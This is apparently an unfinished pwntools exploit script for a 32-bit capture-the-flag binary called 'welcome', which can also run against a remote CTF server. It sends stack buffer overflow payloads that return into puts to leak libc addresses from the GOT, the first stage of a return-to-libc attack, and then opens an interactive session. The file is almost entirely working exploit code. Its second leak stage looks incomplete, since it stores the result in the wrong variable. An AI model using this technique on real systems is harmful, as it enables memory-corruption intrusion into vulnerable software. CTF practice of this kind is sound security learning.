from pwn import *
#import pdb
exe = context.binary = ELF('welcome')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

remotehost = ('ctf.fibonhack.it', 16003)

gdbscript ='''
b *0x08049200
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
context.log_level = 'debug'
io = start(env={"SPORCASTACK":"A"*123}) #env={"SPORCASTACK":"A"*123}
ui.pause()

addr = exe.sym
addr_got = exe.got
addr_plt = exe.plt
ret_addr = 0x080490af


io.recvline()
io.recvline()

##### Generation of unique sequences ####
g = cyclic_gen()
#log.info(f"offset return address: {g.find(b'gaaa')}")

#buff  =   b'A'*60 + p32(addr_plt.puts) + p32(addr_got.puts) + p32(addr.main)+ b'A'*100 p32(addr_got.__libc_start_main) 
buff = flat({
    24: p32(exe.plt.puts) + p32(exe.sym.main),
    32: p32(addr_got.__libc_start_main),
    #40: p32(exe.plt.puts),
    #48: p32(addr_got.__isoc99_scanf),
    110: b'A'
})

io.sendline(buff)

libc_start_address = io.recvline().strip(b'\n')



libc_start_address = list(map(hex, unpack_many(libc_start_address, 32, endian='little', sign=False)))[0]
log.info(f"libc_address leakato: {libc_start_address}")


io.recvline()
io.recvline()

buff1 = flat({
    24: p32(exe.plt.puts) * 4,
    #32: p32(addr_got.__isoc99_scanf) + p32(exe.sym.main) + p32(exe.sym.main),
    110: b'A'
})

io.sendline(buff1)

libc_scanf_address = io.recvline().strip(b'\n')

libc_start_address = list(map(hex, unpack_many(libc_scanf_address, 32, endian='little', sign=False)))[0]
log.info(f"scanf_address leakato: {libc_scanf_address}")

#io.sendline() 

	

io.interactive()